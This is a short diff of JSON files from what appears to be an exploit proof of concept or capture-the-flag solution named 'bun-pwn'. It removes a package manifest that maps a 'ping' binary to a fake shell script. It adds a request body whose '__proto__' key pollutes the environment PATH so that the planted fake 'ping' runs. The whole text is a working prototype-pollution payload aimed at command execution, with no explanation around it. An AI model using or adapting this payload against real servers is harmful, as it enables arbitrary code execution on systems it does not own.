@@ -1,7 +1,9 @@
 {
-  "name": "bun-pwn",
-  "version": "1.0.0",
-  "bin": {
-    "ping": "./fake-ping.sh"
+  "command": "ping",
+  "ip": "127.0.0.1",
+  "__proto__": {
+    "env": {
+      "PATH": "./node_modules/.bin"
+    }
   }
 }
